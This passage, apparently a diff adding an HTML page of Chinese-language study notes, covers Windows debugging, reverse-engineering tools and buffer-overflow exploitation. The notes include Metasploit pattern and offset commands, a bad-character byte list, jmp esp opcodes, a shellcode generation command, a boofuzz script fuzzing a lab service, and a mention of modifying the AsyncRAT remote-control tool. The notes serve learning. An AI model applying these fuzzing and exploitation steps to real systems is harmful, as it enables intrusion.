+  Decimal: 7016996765293437538
+  Octal:   0605413026054130261142
+  Binary:  01100001 01100001 01100001 01100001 01100001 01100001 01100010 01100010
+  Chars:   aaaaaabb
+  Time:    Sat Dec 24 08:48:49.343 23836 (UTC + 8:00)
+  Float:   low 2.5985e+020 high 2.59846e+020
+  Double:  1.22176e+161
+
+</code></pre>
+<ul>
+<li>内存状态</li>
+</ul>
+<pre><code class="language-c">0:000&gt; !address
+
+
+Mapping file section regions...
+Mapping module regions...
+Mapping PEB regions...
+Mapping TEB and stack regions...
+Mapping heap regions...
+Mapping page heap regions...
+Mapping other regions...
+Mapping stack trace database regions...
+Mapping activation context regions...
+
+        BaseAddress      EndAddress+1        RegionSize     Type       State                 Protect             Usage
+--------------------------------------------------------------------------------------------------------------------------
++        0`00000000        0`7ffe0000        0`7ffe0000             MEM_FREE                                       Free       
++        0`7ffe0000        0`7ffe1000        0`00001000 MEM_PRIVATE MEM_COMMIT                                     Other      [User Shared Data]
++        0`7ffe1000        0`7ffe6000        0`00005000             MEM_FREE                                       Free       
++        0`7ffe6000        0`7ffe7000        0`00001000 MEM_PRIVATE MEM_COMMIT                                     &lt;unknown&gt;  [..........O...H.]
++        0`7ffe7000       ad`83a00000       ad`03a19000             MEM_FREE                                       Free       
++       ad`83a00000       ad`83af0000        0`000f0000 MEM_PRIVATE MEM_RESERVE                                    &lt;unknown&gt;  
+        ad`83af0000       ad`83af1000        0`00001000 MEM_PRIVATE MEM_COMMIT                                     PEB        [3e3c]
+        ad`83af1000       ad`83af3000        0`00002000 MEM_PRIVATE MEM_COMMIT                                     TEB        [~0; 3e3c.517c]
+        ad`83af3000       ad`83af5000        0`00002000 MEM_PRIVATE MEM_COMMIT                                     TEB        [~1; 3e3c.211c]
+        ad`83af5000       ad`83c00000        0`0010b000 MEM_PRIVATE MEM_RESERVE                                    &lt;unknown&gt;  
++       ad`83c00000       ad`83dfa000        0`001fa000 MEM_PRIVATE MEM_RESERVE                                    Stack      [~0; 3e3c.517c]
+        ad`83dfa000       ad`83dfd000        0`00003000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE | PAGE_GUARD        Stack      [~0; 3e3c.517c]
+        ad`83dfd000       ad`83e00000        0`00003000 MEM_PRIVATE MEM_COMMIT                                     Stack      [~0; 3e3c.517c]
++       ad`83e00000       ad`83ffc000        0`001fc000 MEM_PRIVATE MEM_RESERVE                                    Stack      [~1; 3e3c.211c]
+        ad`83ffc000       ad`83fff000        0`00003000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE | PAGE_GUARD        Stack      [~1; 3e3c.211c]
+        ad`83fff000       ad`84000000        0`00001000 MEM_PRIVATE MEM_COMMIT                                     Stack      [~1; 3e3c.211c]
+
+</code></pre>
+<h3 id="debug-kernel">debug kernel</h3>
+<pre><code>\\.\pipe\pa
+
+bcdedit /debug on
+
+bcdedit /dbgsettings NET HOSTIP:1.1.1.1 PORT:50000
+
+bcdedit /dbgsettings serial debugport:2 baudrate:115200
+
+</code></pre>
+<h1 id="_40">书籍工具</h1>
+<h2 id="reverse-engineering-for-beginners">Reverse Engineering for Beginners</h2>
+<h2 id="windows_1">Windows 令牌相关学习</h2>
+<p>https://github.com/daem0nc0re/PrivFu/</p>
+<h2 id="_41">工具</h2>
+<h4 id="_42">在线源码汇编互转工具</h4>
+<p>https://godbolt.org/</p>
+<h4 id="pe-tools">PE Tools</h4>
+<p>看pe的</p>
+<h4 id="file">file</h4>
+<p><code>file 1.exe</code><br />
+看文件格式类型的，根据文件头的文件幻数来检查。
+什么是幻数？幻数就是不同格式文件的指纹，例如MZ是PE文件的指纹，16进制幻数是<code>4D 5A</code></p>
+<h4 id="ldd">ldd</h4>
+<p><code>ldd 1.exe</code></p>
+<p>看动态链接程序需要哪些链接库的</p>
+<h4 id="dumpbin">dumpbin</h4>
+<p>vscode自带的程序</p>
+<pre><code>dumpbin.exe /imports 1.exe
+dumpbin.exe /exports 1.exe
+dumpbin /dependents 1.exe   这个跟ldd一样
+
+
+</code></pre>
+<h4 id="string">string</h4>
+<p>查看字符串</p>
+<h4 id="speakeasy">speakeasy</h4>
+<p>模拟shellcode运行，可用于查找CS profile的地址、请求信息等
+https://github.com/mandiant/speakeasy</p>
+<h4 id="asyncrat-c-sharp">AsyncRAT-C-Sharp</h4>
+<p>一款开源远控，可以二开一下改着自己玩---待办
+https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp</p>
+<h2 id="_43">参考资料</h2>
+<h3 id="interpdf">Inter架构手册.pdf</h3>
+<p>https://www.intel.cn/content/www/cn/zh/developer/articles/technical/intel-sdm.html</p>
+<h1 id="_44">命令</h1>
+<ul>
+<li>msf-pattern_create  //生成指定长度的数据</li>
+</ul>
+<pre><code>Usage: msf-pattern_create [options]
+Example: msf-pattern_create -l 50 -s ABC,def,123
+Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf
+
+Options:
+    -l, --length &lt;length&gt;            The length of the pattern
+    -s, --sets &lt;ABC,def,123&gt;         Custom Pattern Sets
+    -h, --help                       Show this message
+
+
+
+</code></pre>
+<ul>
+<li>计算偏移量
+这是根据msf自己生成的唯一字符串来定位的, <code>-q</code>给字符串的16进制，工具会自动计算出EIP的偏移量</li>
+</ul>
+<pre><code>└─# msf-pattern_offset -q 00696CA9                                              
+[*] Exact match at offset 146
+</code></pre>
+<ul>
+<li>所有字符</li>
+</ul>
+<pre><code>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
+</code></pre>
+<ul>
+<li>汇编指令转16进制
+使用MSF的自带工具
+<code>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb</code></li>
+</ul>
+<pre><code>nasm &gt; jmp esp
+00000000  FFE4              jmp esp
+nasm &gt; call esp
+00000000  FFD4              call esp
+</code></pre>
+<ul>
+<li>缓冲区溢出shellcode生成</li>
+</ul>
+<pre><code>generate -b &quot;\x00\x0a\x0d&quot;
+</code></pre>
+<h1 id="_45">工具</h1>
+<pre><code>Ghidra、IDA
+</code></pre>
+<h2 id="boofuzz">boofuzz使用</h2>
+<p>官方指南 https://boofuzz.readthedocs.io/</p>
+<p>注意：脚本名称不能是boofuzz.py，否则会有异常</p>
+<p>安装boofuzz</p>
+<pre><code>python3 -m pip install boofuzz
+</code></pre>
+<p>一个完整的样例脚本如下</p>
+<pre><code class="language-py">#!/usr/bin/python
+
+from boofuzz import *
+
+host = '192.168.14.139'
+port = 9999
+
+def main():
+
+    ses = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')), sleep_time = 3, web_address = '0.0.0.0')
+
+    s_initialize(&quot;TEST&quot;)  # 初始化请求
+
+    s_string(&quot;TRUN&quot;, fuzzable=False) #  发送字符串到栈 fuzzable=False 字符串不变
+    s_delim(&quot; &quot;, fuzzable=False)    # 发送分隔符到栈 fuzzable=False 分隔符不变
+    s_string(&quot;FUZZ&quot;)                # 发送字符串到栈 这段内容是fuzz部分
+
+    ses.connect(s_get(&quot;TEST&quot;))      # 创建一个连接 接收回调
+    ses.fuzz()                      # 开始fuzz
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<h2 id="x64dbgmona">x64dbg安装mona插件</h2>
+<p>x32和x64是分别安装的</p>
+<pre><code>https://github.com/x64dbg/x64dbgpy/releases/download/3177a3ef/python-2.7.11.msi
+https://github.com/x64dbg/x64dbgpy/releases/download/3177a3ef/python-2.7.11.amd64.msi
+
+1、安装x64dbgpy插件支持python
+下载https://github.com/x64dbg/x64dbgpy/releases/download/8c0538a/x64dbgpy_8c0538a.zip
+解压覆盖到安装目录
+
+2、安装mona
+下载地址
+https://github.com/x64dbg/mona
+mona.py复制到plugins/x64dbgpy中
+
+下载
+https://github.com/x64dbg/x64dbgpylib
+复制到plugins/x64dbgpy中
+
+clean_mona.py复制到x64dbgpy/x64dbgpy/autorun中
+
+</code></pre>
+<h1 id="_46">书籍</h1>
+<p>https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/</p>
+<h1 id="_47">再看</h1>
+<p>https://www.x86matthew.com/view_post?id=create_svc_rpc</p>
+<p>异形PE文件
+https://secret.club/2023/06/05/spoof-pe-sections.html</p>
+<p>elf文件
+https://intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/
+https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-2-symbols/
+https://intezer.com/blog/malware-analysis/executable-and-linkable-format-101-part-3-relocations/
+https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/" class="btn btn-xs btn-link">
+        Windows API示例大全
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-link">
+        K8s攻击面
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
